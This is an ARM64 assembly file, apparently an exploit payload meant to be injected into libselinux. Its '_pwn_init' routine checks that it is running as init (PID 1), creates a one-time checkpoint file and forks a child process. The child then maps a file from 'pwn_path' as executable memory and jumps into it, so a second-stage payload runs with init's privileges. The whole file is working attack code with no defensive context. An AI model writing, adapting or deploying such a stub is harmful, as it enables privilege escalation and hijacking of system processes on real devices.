.include "libselinux.inc"

_start:
    bl 0xffffffffffffbd04
    adrp x6, 0xffffffffffff1000
    b _pwn_init

_out:
    mov x0, xzr
    b 0xffffffffffffc7c8

_pwn_init:
    mov x8, SYS_getpid
    svc 0

    subs w0, w0, 1
    b.ne _out

    mov x0, xzr
    add x1, x6, checkpoint
    mov x2, O_CREAT | O_EXCL
    mov x3, xzr
    mov x8, SYS_openat
    svc 0

    tbnz w0, 31, _out

    sub sp, sp, 16

    mov x8, SYS_gettid
    svc 0
    str w0, [sp, 8]

    add x4, sp, 8
    mov x3, xzr
    mov x2, xzr
    mov x1, xzr
    mov x0, CLONE_CHILD_SETTID + CLONE_CHILD_CLEARTID
    add x0, x0, SIGCHLD
    mov x8, SYS_clone
    svc 0

    add sp, sp, 16

    cbnz w0, _out

    mov x0, 0
    add x1, x6, pwn_path
    mov x2, O_RDONLY
    mov x3, xzr
    mov x8, SYS_openat
    svc 0

    mov x4, x0

    mov x8, SYS_mmap
    mov x0, 0
    mov x3, MAP_SHARED
    mov x5, xzr
    mov x2, PROT_EXEC | PROT_READ
    movl x1, 0xa000
    mov x8, SYS_mmap
    svc     0

    add x0, x0, 4
    br x0

    mov x0, xzr
    mov x8, SYS_exit
    svc 0
    ret

.align 4